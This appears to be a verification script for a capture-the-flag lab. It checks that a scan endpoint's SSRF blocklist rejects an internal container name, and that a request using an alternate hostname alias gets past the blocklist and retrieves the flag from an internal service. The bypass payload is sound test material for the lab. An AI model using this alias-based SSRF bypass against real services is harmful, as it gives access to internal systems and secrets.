#!/usr/bin/env bash
# w13 gate-scan :: self-verifying probe.
#
#   ./probe.sh                       # http://localhost:30013
#   ./probe.sh http://host:port
#
# Asserts the SSRF bypass works AND that the blocklist still blocks the name it
# is supposed to (an over-broad guard would silently make the lab unsolvable).
set -uo pipefail

BASE="${1:-http://localhost:30013}"
fail=0

check() { # check <label> <expected-substring> <actual>
  if [[ "$3" == *"$2"* ]]; then
    printf '  ok   %s\n' "$1"
  else
    printf '  FAIL %s\n       expected to contain: %s\n       got: %s\n' "$1" "$2" "$3"
    fail=1
  fi
}

post() { curl -s -X POST "$BASE/scan" -H 'content-type: application/json' -d "$1"; }
get()  { curl -s "$BASE$1"; }

printf '[*] target %s\n' "$BASE"

check "landing page serves"          "GATE"        "$(get /)"
check "health leaks the farm alias"  "statusfarm"  "$(get /api/health)"

# The guard must still do its job on the canonical name, or the lab is trivial.
check "blocklist blocks container name" "blocked: internal range" \
  "$(post '{"url":"http://w0b-w13-internal:9000/secret"}')"

# The bypass.
check "alias reaches the flag"       "hex4b0t{" \
  "$(post '{"url":"http://statusfarm:9000/secret"}')"

# The farm is genuinely unreachable from the host - SSRF is the only route.
if curl -s -m 3 -o /dev/null "http://localhost:9000/secret" 2>/dev/null; then
  printf '  FAIL farm is reachable from the host directly (no host port expected)\n'
  fail=1
else
  printf '  ok   farm has no host port (SSRF is the only route)\n'
fi

if [[ $fail -eq 0 ]]; then
  printf '\n[+] w13 solvable and guard intact\n'
else
  printf '\n[!] w13 probe FAILED\n'
fi
exit $fail
